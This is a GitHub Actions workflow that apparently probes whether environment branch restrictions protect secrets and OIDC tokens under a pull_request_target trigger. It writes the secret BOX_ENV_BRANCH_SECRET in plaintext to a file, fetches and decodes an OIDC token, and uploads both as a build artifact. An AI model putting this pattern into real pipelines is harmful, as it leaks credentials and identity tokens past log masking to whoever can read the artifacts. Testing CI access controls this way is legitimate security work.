name: g4-env-branch
on:
  workflow_dispatch:
  pull_request_target:
    types: [opened]

permissions:
  contents: read
  id-token: write

jobs:
  branchjob:
    runs-on: ubuntu-latest
    environment: box-env-branch
    steps:
      - name: deploy-branch restriction probe
        run: |
          E=/tmp/envbranch.txt
          : > "$E"
          echo "run=$GITHUB_RUN_ID event=$GITHUB_EVENT_NAME" | tee -a "$E"
          echo "ref=$GITHUB_REF" | tee -a "$E"
          echo "sha=$GITHUB_SHA" | tee -a "$E"
          echo "head_ref=$GITHUB_HEAD_REF base_ref=$GITHUB_BASE_REF" | tee -a "$E"
          echo "env name: $GITHUB_ENV_NAME" | tee -a "$E"
          echo "workflow_source_marker=TRUSTED-DEFAULT-BRANCH" | tee -a "$E"
          BOX="${{ secrets.BOX_ENV_BRANCH_SECRET }}"
          echo "BOX_ENV_BRANCH_SECRET len=${#BOX} value=[$BOX]" | tee -a "$E"
          if [ -z "${ACTIONS_ID_TOKEN_REQUEST_URL}" ]; then
            echo "NO OIDC TOKEN (id-token permission absent or env gate blocked)" | tee -a "$E"
          else
            curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=env-branch-probe-aud" -o /tmp/oidc-envbranch.json
          fi
          python3 - "$E" <<'EOF'
          import json,sys,base64
          E=sys.argv[1]
          try:
              obj=json.load(open("/tmp/oidc-envbranch.json"))
          except Exception as ex:
              open(E,'a').write('OIDC fetch raw: '+repr(ex)+'\n'); raise SystemExit
          if 'value' not in obj:
              open(E,'a').write('OIDC fetch raw: '+open('/tmp/oidc-envbranch.json').read()[:200]+'\n')
          else:
              t=obj['value']; h,p,s=t.split('.'); p+='='*(-len(p)%4)
              cl=json.loads(base64.urlsafe_b64decode(p))
              open(E,'a').write('OIDC sub: %s\nOIDC aud: %s\nOIDC repository: %s\n' % (cl.get('sub'),cl.get('aud'),cl.get('repository')))
          EOF
          cp "$E" /tmp/envbranch-final.txt
      - name: upload evidence
        uses: actions/upload-artifact@v4
        with:
          name: g4-env-branch-evidence
          path: /tmp/envbranch-final.txt
